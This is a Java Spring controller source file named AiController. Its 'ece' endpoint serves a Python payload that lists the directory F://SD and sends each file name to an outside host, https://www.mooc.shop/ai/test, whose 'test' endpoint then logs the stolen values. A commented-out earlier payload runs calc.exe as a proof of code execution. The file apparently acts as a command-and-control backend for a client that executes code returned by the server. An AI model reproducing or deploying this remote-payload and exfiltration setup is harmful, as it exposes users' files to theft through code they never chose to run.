package com.mc.block.web.controller;

import com.mc.block.commom.ResultUtil;
import com.mc.block.confine.result.Result;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("ai")
public class AiController {

    @GetMapping("ece")
    public Result ece(String imie){
//        return ResultUtil.success("import os\n" +
//                "os.system(\"calc.exe\")");
        return ResultUtil.success("import os\n" +
                "parents = os.listdir('F://SD')\n" +
                "for parent in parents:\n" +
                "    network().strRequest('https://www.mooc.shop/ai/test?info=%s' % parent)");
    }

    @GetMapping("test")
    public void test(String info){
        System.out.println(info);
    }

    @PostMapping("information")
    public Result information() {
        return ResultUtil.success();
    }
}